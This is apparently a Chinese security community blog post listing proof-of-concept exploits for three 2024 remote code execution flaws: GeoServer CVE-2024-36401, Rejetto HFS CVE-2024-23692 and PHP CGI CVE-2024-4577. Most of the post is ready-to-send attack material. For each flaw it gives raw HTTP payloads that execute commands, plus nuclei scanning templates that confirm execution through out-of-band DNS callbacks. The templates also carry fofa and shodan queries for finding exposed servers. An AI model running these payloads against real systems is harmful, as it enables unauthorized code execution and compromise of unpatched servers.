#  最近的一些高危rce漏洞附poc   
 白帽子社区团队   2024-07-25 22:32  
  
#### 最近的一些高危rce漏洞附poc  
  
第一个  
  
CVE-2024-36401（GeoServer GetPropertyValue RCE）  
  
GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作，在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。  
```
POST /geoserver/wfs HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Connection: close
Content-Length: 376
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US;q=0.9,en;q=0.8
Content-Type: application/xml

<wfs:GetPropertyValue service='WFS' version='2.0.0'
 xmlns:topp='http://www.openplans.org/topp'
 xmlns:fes='http://www.opengis.net/fes/2.0'
 xmlns:wfs='http://www.opengis.net/wfs/2.0'>
  <wfs:Query typeNames='sf:archsites'/>
  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'ping 29aab27a92.ipv6.bypass.eu.org -c 2')</wfs:valueReference>
</wfs:GetPropertyValue>

```  
  
nuclei  
```
id: CVE-2024-36401

info:
  name: GeoServer GetPropertyValue RCE (CVE-2024-36401)
  author: xianke
  severity: critical
  description: |
    GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。
    在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。
  metadata:
    fofa-query: 'app="GeoServer"'
  tags: cve, geoserver, cve2024, rce

requests:
  - raw:
    - |
      POST /geoserver/wfs HTTP/1.1
      Host: {{Hostname}}
      Accept-Encoding: gzip, deflate, br
      Accept: */*
      Accept-Language: en-US;q=0.9,en;q=0.8
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
      Content-Type: application/xml

      <wfs:GetPropertyValue service='WFS' version='2.0.0'
       xmlns:topp='http://www.openplans.org/topp'
       xmlns:fes='http://www.opengis.net/fes/2.0'
       xmlns:wfs='http://www.opengis.net/wfs/2.0'>
        <wfs:Query typeNames='sf:archsites'/>
        <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'ping {{interactsh-url}} -c 2')</wfs:valueReference>
      </wfs:GetPropertyValue>

    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, "dns")
        condition: and

```  
  
第二个  
  
CVE-2024-23692 （Rejetto_HFS远程命令执行漏洞）  
```
GET /?n=%0A&cmd=ipconfig&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.} HTTP/1.1
Host: xx.xxx.xx.xxx
User-Agent: Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
Connection: keep-alive

```  
  
nuclei  
```
id: CVE-2024-23692

info:
  name: Rejetto HTTP File Server - Template injection
  author: johnk3r
  severity: critical
  description: |
    This vulnerability allows a remote, unauthenticated attacker to execute arbitrary commands on the affected system by sending a specially crafted HTTP request.
  reference:
    - [url]https://github.com/rapid7/metasploit-framework/pull/19240[/url]
    - [url]https://mohemiv.com/all/rejetto-http-file-server-2-3m-unauthenticated-rce/[/url]
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-23692
    cwe-id: CWE-1336
  metadata:
    verified: true
    max-request: 1
    shodan-query: product:"HttpFileServer httpd"
  tags: cve,cve2024,hfs,rejetto,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/?n=%0A&cmd=nslookup+{{interactsh-url}}&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: body
        words:
          - "rejetto"

```  
  
第三个  
  
CVE-2024-4577 （PHP CGI远程代码执行漏洞）  
```
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```  
  
nuclei  
```
id: CVE-2024-4577

info:
  name: PHP CGI - Argument Injection
  author: Hüseyin TINTAŞ,sw0rk17,securityforeveryone,pdresearch
  severity: critical
  description: |
    PHP CGI - Argument Injection (CVE-2024-4577) is a critical argument injection flaw in PHP.
  impact: |
    Successful exploitation could lead to remote code execution on the affected system.
  remediation: |
    Apply the vendor-supplied patches or upgrade to a non-vulnerable version.
  metadata:
    verified: true
  tags: cve,cve2024,php,cgi,rce

http:
  - method: POST
    path:
      - "{{BaseURL}}/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
      - "{{BaseURL}}/index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
      - "{{BaseURL}}/test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
      - "{{BaseURL}}/test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"

    body: |
      <?php echo md5("CVE-2024-4577"); ?>

    stop-at-first-match: true
    matchers:
      - type: word
        part: body
        words:
          - "3f2ba4ab3b260f4c2dc61a6fac7c3e8a"

```  
  
  
  
